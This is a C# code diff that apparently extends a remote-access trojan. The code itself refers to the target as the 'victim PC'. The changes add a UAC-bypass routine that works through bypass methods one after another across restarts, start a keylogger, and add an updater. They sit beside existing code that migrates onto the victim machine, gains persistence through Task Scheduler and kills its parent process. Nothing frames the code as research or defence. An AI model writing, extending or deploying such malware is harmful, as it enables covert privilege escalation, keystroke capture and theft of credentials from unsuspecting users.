@@ -14,31 +14,41 @@ namespace Client
         /// <summary>
         /// Main entry point.
         /// </summary>
+        internal static int UACMethod = 0;
         static void Main(string[] args)
         {
             ArgsParser(args);
             CheckRealApplication();
-
+#if !DEBUG
             /// Check if Application is already on victim PC.
-            if (!Constants.IsInVictimPC()) 
+            if (!Constants.IsInVictimPC())
                 Migrate();
 
             /// Attempt to be God.
             if (!Constants.IsAdmin())
-                Armitage.UAC.UACBypass.QuickStart(Armitage.UAC.UACMethods.ICMLuaUtil);
+            {
+                if (Utilities.Ranging.IsInEnumRange<Armitage.UAC.UACMethods>(UACMethod))
+                    Armitage.UAC.UACBypass.QuickStart((Armitage.UAC.UACMethods)UACMethod);
+                // else...do nothing ;(
+            }
             else
             {
                 /// Things to do when admin.
                 Armitage.Startup.ViaTaskScheduler();
                 ProtectTheLetter();
             }
-
+#endif
             /// Start loggers.
+            Armitage.Watchers.Keylogger.Start();
+
+            /// Init update checkers.
+            Utilities.Updater Updater = new Utilities.Updater();
+            Updater.Start();
 
             while (true)
             {
                 // Sleep
-                Thread.Sleep(10000);
+                Thread.Sleep(10 * 1000);
             }
         }
 
@@ -48,7 +58,17 @@ namespace Client
             {
                 if (args.Length > 0)
                 {
-                    Process.GetProcessById(int.Parse(args[0].Trim())).Kill();
+                    int parent = int.Parse(args[0].Trim());
+                    if (parent > 0)
+                        Process.GetProcessById(parent).Kill();
+
+                    if (args.Length > 1)
+                    {
+                        /// Find suitable UAC method.
+                        /// Since the last method didn't work,
+                        /// increment the active method.
+                        UACMethod = int.Parse(args[1].Trim()) + 1;
+                    }
                 }
             }
             catch { }
